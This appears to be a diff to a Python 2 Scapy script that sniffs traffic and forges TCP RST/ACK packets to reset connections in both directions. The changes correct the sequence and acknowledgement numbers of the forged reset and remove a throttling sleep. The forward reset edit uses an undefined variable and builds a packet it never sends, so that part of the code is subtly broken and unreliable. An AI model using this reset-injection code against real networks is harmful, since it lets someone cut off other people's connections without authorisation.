@@ -10,10 +10,14 @@ def usage():
     sys.exit(1)
 
 def forward_rst(pkt):
+    i=pkt['IP']
+    t=pkt['TCP']
     pkt['TCP'].flags=0b10100
     #pkt['TCP'].window+=1
     print '[*]forward_rst'
-    print pkt.summary()
+    #print pkt.summary()
+    p=IP(dst=i.dst,src=i.src)/TCP(dport=t.dport,sport=s.dport,flags=0b10100,window=0,ack=t.ack,seq=t.seq)
+
     send(pkt)
 
 def backward_rst(pkt):
@@ -21,7 +25,7 @@ def backward_rst(pkt):
     print '[*]backward_rst'
     i=pkt['IP']
     t=pkt['TCP']
-    p=IP(dst=i.src,src=i.dst)/TCP(dport=t.sport,sport=t.dport,flags=0b10100,window=0,ack=pkt['TCP'].ack)
+    p=IP(dst=i.src,src=i.dst)/TCP(dport=t.sport,sport=t.dport,flags=0b10100,window=0,ack=t.seq,seq=t.ack)
     p.show()
     send(p)
 
@@ -46,8 +50,8 @@ def backward_fin(pkt):
 def pkt_callback(pkt):
     global cnt
     cnt=cnt+1
-    if cnt==100000000:
-        time.sleep(10000)
+    #if cnt==100000000:
+    #    time.sleep(10000)
     #F = bin(pkt['TCP'].flags
     print pkt.summary()
     if pkt.haslayer(Raw):
